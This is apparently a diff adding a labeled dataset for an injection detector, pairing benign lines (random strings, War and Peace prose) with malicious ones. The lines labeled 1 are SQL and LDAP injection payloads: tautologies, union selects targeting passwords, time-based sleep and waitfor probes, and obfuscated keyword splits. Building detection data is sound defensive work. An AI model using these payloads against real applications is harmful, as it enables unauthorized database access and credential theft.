@@ -1,0 +1,36 @@
+0 a<EQJ/-Kab
+0 8.uVHbph6q
+0 (]SD.0]qAt
+0 Q.ltA`25e@
+0 At eight o'clock Kutuzov rode to Pratz at the head of Miloradovich's
+0 fourth column, the one which was to take the place of the columns of
+0 Przebyszewski and Langeron, which had already gone down. He greeted
+0 the men of the head regiment and gave the order to move, thus showing
+1 SELECT system_user();
+1 SELECT user FROM mysql.user;
+1 SELECT char(65);
+1 /*!32302 1/0, */
+1 %' or '0'='0
+1 %' and 1=0 union select null, concat(first_name,0x0a,last_name,0x0a,user,0x0a,password) f
+1  or 1=1--
+1  or username like '%
+1 ; begin declare @var varchar(8000) set @var=' ...
+1 ; execute immediate 'sel' || 'ect us' || 'er'
+1 " or isNULL(1/0) /*
+1 ");waitfor delay '0:0:__TIME__'--
+1 ")) or benchmark(10000000,MD5(1))#
+1 "hi"") or (""a""=""a"
+1 ) or (a=a
+1 ) or sleep(__TIME__)='
+1 );waitfor delay '0:0:__TIME__'--
+1 )%20or%20('x'='x
+1 *(|(objectclass=*))
+1 1 or sleep(__TIME__)#
+1 declare @s varchar (200) select @s = 0x73656c6 ...
+1 or '1'='1
+1 or 0=0 --
+1 or 1=1 or ""=
+1 or%201=1 --
+1 uni/**/on sel/**/ect
+1 x' AND userid IS NULL; --
+1 INSERT INTO Table (col, col2, col3) SELECT col, col2, col3 FROM other_table WHERE sql = '
